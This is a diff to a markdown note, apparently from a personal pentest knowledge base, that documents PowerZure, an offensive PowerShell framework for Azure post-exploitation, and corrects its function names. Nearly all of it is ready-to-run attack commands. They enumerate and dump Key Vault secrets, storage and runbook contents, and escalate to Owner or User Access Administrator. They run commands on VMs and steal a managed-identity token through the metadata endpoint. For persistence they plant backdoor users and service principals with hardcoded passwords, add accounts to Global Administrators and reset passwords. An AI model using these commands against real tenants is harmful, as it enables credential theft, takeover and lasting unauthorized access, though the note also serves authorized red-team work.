@@ -8,96 +8,79 @@ PowerShell offensive Azure framework for post-exploitation after gaining Azure c
 **Install:**
 ```powershell
 git clone https://github.com/hausec/PowerZure
-Import-Module .\PowerZure.ps1
+Import-Module .\PowerZure.psd1        # module manifest — NOT PowerZure.ps1
 
 # Requires Az + AzureAD modules
 Install-Module Az -Scope CurrentUser
 Connect-AzAccount
 ```
 
-> [!note] **PowerZure vs MicroBurst** — Similar scope, different strengths. PowerZure has more structured workflow and covers more Entra ID attack paths. MicroBurst has better credential harvesting (`Get-AzPasswords`). Run both on Azure engagements.
+> [!warning] **Verified against `PowerZure.psm1` (2026-08) — the whole `Get-Az*`/`New-Az*` vocabulary older guides use is WRONG.** PowerZure functions are all `*-Azure*` (e.g. `Get-AzureTarget`, `Get-AzureUser`, `Add-AzureRole`, `Invoke-AzureRunCommand`). The `Get-Az*` names actually belong to **Microsoft's official Az module** — calling them runs a different Microsoft cmdlet (or nothing), not PowerZure. Everything below is the real function set; list it with `Invoke-PowerZure -h` or `Get-Command -Module PowerZure`.
+
+> [!note] **PowerZure vs MicroBurst** — Similar scope, different strengths. PowerZure has a more structured workflow and covers more Entra ID attack paths. MicroBurst has broader one-shot credential harvesting (`Get-AzPasswords`). Run both on Azure engagements.
 
 ---
 
 ## Initial Recon
 
 ```powershell
-# Who am I, what subscriptions do I have access to?
-Show-AzCurrentUser
-Get-AzSubscriptions
+# Menu / self-check of what you can do with the current context
+Invoke-PowerZure -h
 
-# Set target subscription
-Set-AzSubscription -Id <sub-id>
-
-# Full environment overview
-Get-AzTargets
-# Returns: VMs, web apps, storage, Key Vaults, service principals, role assignments
+# Who am I? Then the big one — enumerate everything you can touch
+Get-AzureCurrentUser
+Get-AzureTarget                       # VMs, storage, Key Vaults, apps, RBAC, etc. you can reach
+Get-AzureTarget -List                 # list form
+Get-AzureTenantId
+Set-AzureSubscription -Id <sub-id>    # switch active subscription
 ```
 
 ---
 
-## User & Role Enumeration
+## User, Role & App Enumeration
 
 ```powershell
-# All users in the tenant
-Get-AzUsers
-Get-AzUsers -User <upn>
+# Users
+Get-AzureUser -All
+Get-AzureUser -Username <upn>
 
-# All groups and members
-Get-AzGroups
-Get-AzGroupMembers -Group "Global Administrators"
+# Group membership
+Get-AzureGroupMember -Group "Global Administrators"
 
-# Role assignments — who has what
-Get-AzRoleAssignments
-Get-AzRoleAssignments -User <upn>
+# Roles — assignments, members, and the raw permission set
+Get-AzureRole -All
+Get-AzureRoleMember -Role "Owner"
+Get-AzureRolePermission -Role <role>
+Get-AzurePIMAssignment                # eligible (PIM) roles — activation = privesc
 
-# Service principals + permissions
-Get-AzServicePrincipals
-Get-AzServicePrincipalPermissions -ServicePrincipal <name>
-
-# App registrations
-Get-AzApps
-Get-AzAppOwners -App <name>
+# Apps / SPs / managed identities
+Get-AzureAppOwner -App <name>
+Get-AzureManagedIdentity
 ```
 
 ---
 
-## Resource Enumeration
+## Resource Enumeration & Loot
 
 ```powershell
-# All resources
-Get-AzResources
+# Key Vault contents (secrets/keys/certs) — read, or dump everything
+Get-AzureKeyVaultContent -VaultName <vault>
+Show-AzureKeyVaultContent -All        # enumerate across all readable vaults
+Export-AzureKeyVaultContent -VaultName <vault>
 
-# VMs
-Get-AzVMs
-Get-AzVMDetails -VM <name>
+# Storage — list and pull blobs/file shares
+Get-AzureStorageContent -StorageAccountName <name> -ContainerName <container>
+Show-AzureStorageContent -StorageAccountName <name>
 
-# Storage accounts
-Get-AzStorageAccounts
+# Automation: RunAs identity, certs, and runbook source (often holds creds)
+Get-AzureRunAsAccount
+Get-AzureRunAsCertificate
+Get-AzureRunbookContent -All
 
-# Key Vaults + secrets
-Get-AzKeyVaults
-Get-AzKeyVaultSecrets -Vault <name>
-Get-AzKeyVaultKeys -Vault <name>
-
-# App Services + Function Apps
-Get-AzWebApps
-Get-AzFunctionApps
-
-# Logic Apps (connections often contain credentials)
-Get-AzLogicApps
-
-# Automation Accounts
-Get-AzAutomationAccounts
-Get-AzAutomationCredentials -Account <name>
-
-# SQL
-Get-AzSQLServers
-Get-AzSQLDatabases -Server <name>
-
-# Network + public IPs
-Get-AzNetworkConfig
-Get-AzPublicIPs
+# Logic App connectors (frequently carry stored credentials) + SQL + VM disks
+Get-AzureLogicAppConnector
+Get-AzureSQLDB -All
+Get-AzureVMDisk
 ```
 
 ---
@@ -105,19 +88,20 @@ Get-AzPublicIPs
 ## Privilege Escalation
 
 ```powershell
-# Check current permissions
-Get-AzPermissions
+# The classic PowerZure privesc: if you can elevate access, grant yourself
+# User Access Administrator at root scope over all subscriptions.
+Set-AzureElevatedPrivileges
 
-# Add role assignment (requires Microsoft.Authorization/roleAssignments/write)
-Set-AzRole -Role "Owner" -User <upn> -Scope "/subscriptions/<sub-id>"
+# Assign a role to a principal (needs Microsoft.Authorization/roleAssignments/write)
+Add-AzureRole -Role "Owner" -Username <upn> -Scope "/subscriptions/<sub-id>"
 
-# Create new backdoor SP with Owner role
-New-AzBackdoor -Username backdoor -Password 'P@ssw0rd123!' -Role Owner
+# VM code execution (needs VM Contributor+) — several delivery methods:
+Invoke-AzureRunCommand -VMName <name> -Command 'whoami /all'
+Invoke-AzureRunProgram -VMName <name> -Command '...'          # run an uploaded program
+Invoke-AzureCustomScriptExtension -VMName <name> -Command '...'
+Invoke-AzureVMUserDataCommand -VMName <name> -Command '...'   # via user-data agent
 
-# VM command execution (requires VM Contributor or higher)
-Invoke-AzVMCommand -VM <name> -ResourceGroup <rg> -Command 'whoami /all'
-
-# Get managed identity token from inside a VM (run on target VM)
+# Managed-identity token from inside a VM (run on the target VM)
 curl -H "Metadata:true" \
   "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
 ```
@@ -127,40 +111,29 @@ curl -H "Metadata:true" \
 ## Persistence
 
 ```powershell
-# Add secret to existing app registration
-Add-AzADAppSecret -App <name>
+# Backdoor: create a new user or service principal with a role
+New-AzureBackdoor -Username backdoor -Password 'P@ssw0rd123!'
+Invoke-AzureMIBackdoor                        # abuse a managed identity for persistence
 
-# Create new Global Admin user
-New-AzUser -Username backdoor@company.com -Password 'P@ssw0rd123!' -Role GlobalAdmin
+# New Entra user / add secret to an existing app registration (persistent app auth)
+New-AzureADUser -Username backdoor@company.com -Password 'P@ssw0rd123!'
+Add-AzureADSPSecret -AppName <name>           # or -AppID <app-id>
 
-# Add service principal with Owner role
-New-AzBackdoor -Username sp-backdoor -Password 'P@ssw0rd123!' -Role Owner -ServicePrincipal
+# Add to a privileged group / grant an Entra role / reset a password
+Add-AzureGroupMember -Group "Global Administrators" -Username <upn>
+Add-AzureADRole -Role "Global Administrator" -Username <upn>
+Set-AzureUserPassword -Username <upn> -Password 'NewPass123!'
 
-# Add to privileged group
-Add-AzGroupMember -Group "Global Administrators" -User <upn>
+# Run arbitrary commands via a rogue Automation runbook
+Invoke-AzureCommandRunbook -Command 'whoami'
 ```
 
 ---
 
-## Data Exfiltration
-
-```powershell
-# All Key Vault secrets
-Get-AzKeyVaultSecrets -All
-
-# Storage blobs
-Get-AzStorageContents -StorageAccount <name>
-
-# Automation runbooks (may contain credentials in plaintext)
-Get-AzRunbooks -Account <name>
-
-# App Service + Function App environment variables
-Get-AzAppSettings -App <name>
-Get-AzFunctionSettings -App <name>
-```
+> [!note] **See also** — pair with [[Tools/Cloud/MicroBurst|MicroBurst]] (`Get-AzPasswords` for one-shot cred harvest) and [[Tools/Cloud/AADInternals|AADInternals]] (identity/Entra attacks). Get an access token from either, or via [[Tools/Cloud/ROADtools|ROADtools]] `roadtx`.
 
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-27*
+*Model: claude-opus-5*
